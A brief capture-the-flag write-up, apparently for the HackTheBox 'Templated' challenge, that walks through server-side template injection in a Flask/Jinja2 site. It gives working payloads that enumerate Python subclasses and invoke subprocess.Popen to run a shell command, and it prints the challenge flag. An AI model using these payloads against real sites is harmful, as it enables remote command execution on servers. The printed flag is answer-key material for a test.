# HTB Templated 

We are given with a target url. Upon enter it's a simple flask jinja site. Hmmm

After some OSINT, it's clear that the attack we will be conduct is SSTI, with a very neat cheatsheet here (https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) 

The exploit is conducted in the following sequence: 
1. Reconn:  url/{{ '7' *7}} -> page '7777777' ....   : this means it is vulnerable
2. Enumerate its classes: {{ ''.__mro__[1].__subclasses__() }} 
3. Found out <type 'file'> is no longer available in python 3 ( https://security.stackexchange.com/questions/208957/flask-jinja2-ssti-to-get-rce-type-file-not-in-object-subclasses )
4. Use <class 'subprocess.Popen'> (find your own index in your env) as suggested here ( https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee ) 
5. Exploit with url/{{ '.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate() }}
   // it calls subprocess to execute cat flag.txt and dump stdout via .communicate() (also stderr, but we don't really care  
6. The flag is in then displayed in the page: The page '(b'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}\n', None)' could not be found 
